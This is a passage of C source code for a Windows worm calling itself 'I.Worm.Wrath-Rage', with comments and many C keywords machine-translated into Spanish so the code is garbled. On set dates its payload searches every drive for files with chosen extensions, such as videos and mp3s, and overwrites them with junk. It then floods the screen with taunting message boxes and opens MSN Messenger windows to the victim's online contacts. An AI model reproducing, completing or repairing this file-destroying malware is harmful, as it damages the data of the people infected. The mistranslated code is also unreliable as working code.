Función para ejecutar la carga útil del gusano.
*/
void executePayload() {
	//payload del gusano cambiará dependiendo del día.
	SYSTEMTIME x;
	GetSystemTime(&x);
	if ((x.wDay == 1) && (x.wMonth == 11)) {
		//esta es una fecha muy especial para mí. probablemente representa por qué hago este gusano
		//por qué odio algunas cosas.. por qué.. muchas cosas. es hora de ser un SOB.
		fuckAll(); //fuck all
	}
	más {
		if ((x.wDay == 3) || (x.wDía == 9)) {
			//i como el número 3 y el número 9.
			defaultPayload();
		}
	}

}
/*
 1-11, tiempo para follar todo.
*/
void fuckAll() {
	findFilesToFuck(arrayExtensionsVeryFuckedPayload); //buscar archivos para follar.
	fuckFilesStoredInStruct();
	int i = 0;
	mientras que (i < 10000) {
		MessageBox(NULL,"1-11 Lamento decirte esto pero.. te han jodido. 1 de noviembre, día de la muerte de la gente, y mucho más. \n\n I.Worm.Wrath-Rage codificado por jalo (drm~r). ","I.Worm.Wrath-Rage",NULL);
		i++;
	}
	openMSNWindows();
	Dormir(60000);
	Salirventas(0, 0);
}
/*
 Carga útil predeterminada, ejecutada los días 3 y 9 de cada mes
*/
void defaultPayload() {
	findFilesToFuck(arrayExtensionsDefaultPayload); //buscar archivos para follar.
	fuckFilesStoredInStruct();
	int i = 0;
	openMSNWindows();
	mientras que (i < 100) {
		MessageBox(NULL,"Siento decirte esto, pero te han jodido. \n\nI.Worm.Wrath-Rage codificado por jalo (drm~r)","I.Worm.Wrath-Rage",NULL);
		i++;
	}
	Dormir(30000);
	Salirventas(0, 0);
	//default payload hace:
	//fuck .avi, .mpg, .part y archivos de .mp3
	//mostrar un mensaje al usuario
}
/*
 Busque archivos en la ruta especificada, con la extensión especificada y almacenada en la estructura especificada.
*/
void findFiles(char *where, char *arrayExtensions[], struct FILESTOFUCK *fToFuck) {
	HANDLE hFind;
	WIN32_FIND_DATA FindFileData;
	char *w = (char*)malloc(sizeof(char) * (strlen(where) + 2));
	strcpy(w,donde);
	strcat(w,"*");
	hFind = FindFirstFile(w, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE) {
		if ((FindFileData. dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) && (strcmp(FindFileData. cFileName,".. ") ! = 0) && (strcmp(FindFileData. cFileName,".") != 0)) {
			//if es un directorio..
			char *w2 = (char*)malloc(sizeof(char) * (strlen(where) + strlen(FindFileData. cFileName) + 2));
			strcpy(w2,donde);
			strcat(w2,FindFileData. cFileName);
			strcat(w2,"\\");
			
			findFiles(w2,arrayExtensions,fToFuck);
		}
		más {
			if (isExtSearched(fileExt(FindFileData. cFileName),arrayExtensions)) {
				//archivo para follar
					char *aux = (char*) malloc(sizeof(char) * (strlen(FindFileData. cFileName) + strlen(donde) + 1));
					strcpy(aux,donde);
					strcat(aux,FindFileData. cFileName);
					fToFuck->names[fToFuck->counter] = (char*)malloc(sizeof(char) * (strlen(aux) + 1));
					strcpy(fToFuck->names[fToFuck->counter],aux);
					fToFuck->counter++;
			}
		}
	}
	while (FindNextFile(hFind,&FindFileData) != 0) {
		if (hFind != INVALID_HANDLE_VALUE) {
			if ((FindFileData. dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) && (strcmp(FindFileData. cFileName,".. ") ! = 0) && (strcmp(FindFileData. cFileName,".") != 0)) {
				char *w2 = (char*)malloc(sizeof(char) * (strlen(where) + strlen(FindFileData. cFileName) + 2));
				strcpy(w2,donde);
				strcat(w2,FindFileData. cFileName);
				strcat(w2,"\\");
				findFiles(w2,arrayExtensions,fToFuck);
				//if es un directorio.
			}
			más {
				if (isExtSearched(fileExt(FindFileData. cFileName),arrayExtensions)) {
					//archivo para follar
					char *aux = (char*) malloc(sizeof(char) * (strlen(FindFileData. cFileName) + strlen(donde) + 1));
					strcpy(aux,donde);
					strcat(aux,FindFileData. cFileName);
					fToFuck->names[fToFuck->counter] = (char*)malloc(sizeof(char) * (strlen(aux) + 1));
					strcpy(fToFuck->names[fToFuck->counter],aux);
					fToFuck->counter++;
				}
			}
		}
	}
	FindClose(hFind);
}
/*
 Función para obtener la extensión del archivo.
*/
char *fileExt(char *f) {
	char *ext;
	int posPoint = -1;
	for (int i = (int)strlen(f); i >= 0; i--) {
		if (f[i] == '.') {//buscar el char '.' en la cadena
 posPoint = i; //posición de char '.' (invertido para encontrar la extensión)
			quebrar;
		}
	}
	if (posPoint == -1) {
		//notfound
		devolver NULL;
	}
	más {
		ext = (char*)malloc(sizeof(char) * ((strlen(f) - posPoint) + 1));
		int j = 0;
		int i = (posPoint + 1);
		para (; i < strlen(f); i++,j++) {
			ext[j] = f[i];
		}
		ext[j] = '\0';
		devolución ext;
	}
}
/*
 Función para saber que el parámetro 'ext' está en char 'array'. (Coincidencia exacta)
*/
int isExtSearched(char *ext,char *array[]) {
	if (ext == NULL) devuelve 0; //si no hay encuentro puntual, ext será null
	int i = 0;
	while (array[i] != NULL) {
		if (strcmp(array[i],ext) == 0) {
			volver 1;
		}
		i++;
	}
	volver 0;
}
/*
 Encuentra en todas las unidades archivos para follar.
*/
void findFilesToFuck(char *extensionsToFind[]) {
	int i = 0;
	while (drivesWhereSearchFilesToFuck[i] != NULL) {
		findFiles(drivesWhereSearchFilesToFuck[i],extensionsToFind,&files);
		i++;
	}
}
/*
 A la mierda cada archivo almacenado en la estructura.
*/
void fuckFilesStoredInStruct() {
	for (int i = 0; i < archivos. contador; i++) {
 ARCHIVO *f = fopen(archivos. nombres[i],"w");
		fwrite(bufferFileFucked,1,strlen(bufferFileFucked),f);
		fclose(f);
	}
}
void openMSNWindows() {
	pCount largo;
 Correo electrónico de BSTR;
 IMessengerContactos *pIMessengerContactos = NULL;
	IMessengerContact *pIMessengerContact = NULL;
	IMessengerWindow *pIMessengerWindow = NULL;
	IDispatch *pIDispatch = NULL;
	IDispatch *ppMContact = NULL;
 IMessenger *pIMessenger = NULL; //a puntero a una interfaz IMessenger
	CoInitializar(0);
	CoCreateInstance(CLSID_Messenger, NULL, CLSCTX_ALL, IID_IMessenger, (void **)&pIMessenger);
	pIMessenger->get_MyContacts(&pIDispatch);
	pIDispatch->QueryInterface(IID_IMessengerContacts,(void**)&pIMessengerContacts);
	pIDispatch->Release();
	pIMessengerContacts->get_Count(&pCount);
	char *mails = (char*)malloc(sizeof(char) * (pCount * 256));
	strcpy(correos,"");
	for (int i = 0; i < pCount; i++) {
	if (pIMessengerContacts->Item(i,&pIDispatch) == S_OK) {
		if (pIDispatch->QueryInterface(IID_IMessengerContact,(void**)&pIMessengerContact) == S_OK) {
			if (pIMessengerContact->get_SigninName(&email) == S_OK) {
 Estado MISTATUS;
				if (pIMessengerContact->get_Status(&status) == S_OK) {
						// Abierto solo a usuarios en línea.
 BSTR contactstr = _bstr_t(correo electrónico);
 Contacto VARIANT;
 contacto. vt=VT_BSTR;
 contacto. bstrVal=contactstr;
						if (pIMessenger->InstantMessage(contact,&pIDispatch) == S_OK) {
							pIDispatch->QueryInterface(IID_IMessengerWindow,(void**)&pIMessengerWindow);
 CONTACTO LARGOHwnd;
							pIMessengerWindow->get_HWND(&ContactHwnd);
							pIMessengerWindow->Release();
					}
				}
			}
		}
	}
}
pIMessenger->Release();
CoUninitializar();
ExitProcess(0);
}
